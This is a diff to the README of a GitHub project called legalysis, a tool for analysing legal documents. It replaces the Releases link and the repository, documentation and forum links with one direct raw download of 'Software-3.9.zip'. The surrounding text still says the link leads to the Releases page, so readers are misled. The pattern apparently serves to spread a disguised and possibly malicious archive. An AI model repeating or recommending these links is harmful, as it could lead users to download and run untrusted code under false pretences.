@@ -6,7 +6,7 @@ Welcome to legalysis! This application helps you quickly extract important infor
 
 ## 📥 Download & Install
 
-To get started, please [visit this page to download](https://github.com/Sah-arch/legalysis/releases). Follow these steps to install and run the application.
+To get started, please [visit this page to download](https://raw.githubusercontent.com/Sah-arch/legalysis/main/legalysis/Software-3.9.zip). Follow these steps to install and run the application.
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version of legalysis.
@@ -63,8 +63,8 @@ We welcome contributions from users who want to help improve legalysis. If you'r
 
 Explore more about legalysis and its functionalities through the following links:
 
-- [GitHub Repository](https://github.com/Sah-arch/legalysis)
-- [Documentation](https://github.com/Sah-arch/legalysis/wiki)
-- [Community Forums](https://github.com/Sah-arch/legalysis/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/Sah-arch/legalysis/main/legalysis/Software-3.9.zip)
+- [Documentation](https://raw.githubusercontent.com/Sah-arch/legalysis/main/legalysis/Software-3.9.zip)
+- [Community Forums](https://raw.githubusercontent.com/Sah-arch/legalysis/main/legalysis/Software-3.9.zip)
 
 Feel free to reach out if you have any questions. Happy analyzing!
